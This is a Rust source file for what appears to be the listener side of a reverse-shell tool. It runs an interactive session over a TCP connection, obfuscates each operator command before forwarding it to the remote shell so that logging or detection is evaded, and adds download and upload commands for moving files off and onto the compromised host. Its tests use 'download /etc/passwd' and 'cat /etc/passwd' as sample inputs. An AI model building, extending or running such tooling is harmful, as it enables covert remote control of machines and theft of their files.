//! Interactive session loop with meta-command support.
//!
//! Meta-commands (`help`, `exit`, `clear`, `download`, `upload`) are
//! intercepted locally; everything else is obfuscated and forwarded
//! to the remote shell. Colored banners and prompts are provided by
//! the [`prompt`] module.

use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::sync::mpsc;

use crate::obfuscation::ObfuscationStrategy;
use crate::output::clean_output;
use crate::{prompt, transfer};

/// Run the interactive obfuscated shell session.
pub async fn run_session(
    stream: TcpStream,
    peer_addr: std::net::SocketAddr,
    engine: &(dyn ObfuscationStrategy + Sync),
) -> Result<(), anyhow::Error> {
    let (mut reader, mut writer) = stream.into_split();
    let mut stdout = tokio::io::stdout();

    let banner = prompt::banner_connected(&peer_addr);
    stdout.write_all(banner.as_bytes()).await?;
    stdout.write_all(b"\n").await?;
    stdout.flush().await?;

    let (cmd_tx, mut cmd_rx) = mpsc::channel::<String>(64);

    let stdin_task = tokio::spawn(async move {
        let mut stdin = BufReader::new(tokio::io::stdin());
        let mut line = String::new();
        loop {
            line.clear();
            match stdin.read_line(&mut line).await {
                Ok(0) => break,
                Ok(_) => {
                    let trimmed = line.trim_end_matches('\n').trim_end_matches('\r');
                    if cmd_tx.send(trimmed.to_string()).await.is_err() {
                        break;
                    }
                }
                Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
                Err(_) => break,
            }
        }
    });

    let mut buf = vec![0u8; 8192];

    let result: Result<(), anyhow::Error> = loop {
        tokio::select! {
            Some(cmd) = cmd_rx.recv() => {
                if cmd.trim().is_empty() {
                    continue;
                }

                let trimmed = cmd.trim();
                if trimmed == "exit" || trimmed == "quit" {
                    stdout.write_all(b"exiting...\n").await?;
                    stdout.flush().await?;
                    break Ok(());
                }

                if let Some(action) = parse_meta(&cmd) {
                    handle_meta(action, &mut reader, &mut writer, &mut stdout).await?;
                } else {
                    let obfuscated = engine.obfuscate(&cmd);
                    writer.write_all(obfuscated.as_bytes()).await?;
                    writer.write_all(b"\n").await?;
                    writer.flush().await?;
                }
            }
            n = reader.read(&mut buf) => {
                let n = n?;
                if n == 0 {
                    let msg = prompt::banner_disconnected();
                    stdout.write_all(msg.as_bytes()).await?;
                    stdout.write_all(b"\n").await?;
                    stdout.flush().await?;
                    break Ok(());
                }
                let cleaned = clean_output(&buf[..n]);
                stdout.write_all(cleaned.as_bytes()).await?;
                stdout.flush().await?;
            }
            _ = tokio::signal::ctrl_c() => {
                break Ok(());
            }
        }
    };

    drop(cmd_rx);
    stdin_task.abort();
    let _ = stdin_task.await;
    result
}

// ---------------------------------------------------------------------------
// Meta-commands
// ---------------------------------------------------------------------------

enum MetaAction {
    Help,
    Clear,
    Download { remote: String, local: String },
    Upload { local: String, remote: String },
}

fn parse_meta(cmd: &str) -> Option<MetaAction> {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.is_empty() {
        return None;
    }
    match parts[0] {
        "help" => Some(MetaAction::Help),
        "clear" | "cls" => Some(MetaAction::Clear),
        "download" => {
            if parts.len() < 2 {
                return Some(MetaAction::Help);
            }
            let remote = parts[1].to_string();
            let local = parts.get(2).map(|s| s.to_string()).unwrap_or_else(|| {
                remote.rsplit('/').next().unwrap_or(&remote).to_string()
            });
            Some(MetaAction::Download { remote, local })
        }
        "upload" => {
            if parts.len() < 3 {
                return Some(MetaAction::Help);
            }
            Some(MetaAction::Upload {
                local: parts[1].to_string(),
                remote: parts[2].to_string(),
            })
        }
        _ => None,
    }
}

async fn handle_meta(
    action: MetaAction,
    reader: &mut tokio::net::tcp::OwnedReadHalf,
    writer: &mut tokio::net::tcp::OwnedWriteHalf,
    stdout: &mut tokio::io::Stdout,
) -> Result<(), anyhow::Error> {
    match action {
        MetaAction::Help => {
            stdout.write_all(prompt::help_text().as_bytes()).await?;
        }
        MetaAction::Clear => {
            stdout.write_all(b"\x1b[2J\x1b[H").await?;
        }
        MetaAction::Download { remote, local } => {
            let msg = format!("[*] downloading {} -> {} ...", remote, local);
            stdout.write_all(msg.as_bytes()).await?;
            stdout.write_all(b"\n").await?;
            stdout.flush().await?;
            transfer::download(reader, writer, &remote, &local).await?;
            let ok = prompt::banner_file_saved(&local);
            stdout.write_all(ok.as_bytes()).await?;
            stdout.write_all(b"\n").await?;
            stdout.flush().await?;
        }
        MetaAction::Upload { local, remote } => {
            let msg = format!("[*] uploading {} -> {} ...", local, remote);
            stdout.write_all(msg.as_bytes()).await?;
            stdout.write_all(b"\n").await?;
            stdout.flush().await?;
            transfer::upload(writer, &local, &remote).await?;
            stdout.write_all(b"[+] upload complete\n").await?;
            stdout.flush().await?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::cli::ObfuscationLevel;
    use crate::obfuscation::create_strategy;

    struct MockObfuscator;
    impl ObfuscationStrategy for MockObfuscator {
        fn obfuscate(&self, cmd: &str) -> String {
            format!("OBFUSCATED({cmd})")
        }
    }

    #[tokio::test]
    async fn mock_obfuscator_works() {
        let m = MockObfuscator;
        assert_eq!(m.obfuscate("ls"), "OBFUSCATED(ls)");
    }

    #[tokio::test]
    async fn strategy_is_send_sync() {
        fn assert_send<T: Send>(_: &T) {}
        fn assert_sync<T: Sync>(_: &T) {}

        let engine = create_strategy(ObfuscationLevel::Light, crate::cli::ShellType::Linux);
        assert_send(&engine);
        assert_sync(&engine);
    }

    #[test]
    fn parse_meta_help() {
        assert!(parse_meta("help").is_some());
        assert!(parse_meta("clear").is_some());
        assert!(parse_meta("cls").is_some());
    }

    #[test]
    fn parse_meta_exit_returns_none() {
        assert!(parse_meta("exit").is_none());
        assert!(parse_meta("quit").is_none());
    }

    #[test]
    fn parse_meta_download() {
        let r = parse_meta("download /etc/passwd").unwrap();
        assert!(matches!(r, MetaAction::Download { .. }));
    }

    #[test]
    fn parse_meta_upload() {
        let r = parse_meta("upload ./foo /tmp/foo").unwrap();
        assert!(matches!(r, MetaAction::Upload { .. }));
    }

    #[test]
    fn parse_meta_upload_insufficient_args() {
        let r = parse_meta("upload ./foo");
        assert!(r.is_some()); // returns Help on insufficient args
    }

    #[test]
    fn parse_meta_regular_command_returns_none() {
        assert!(parse_meta("ls -la").is_none());
        assert!(parse_meta("cat /etc/passwd").is_none());
    }
}
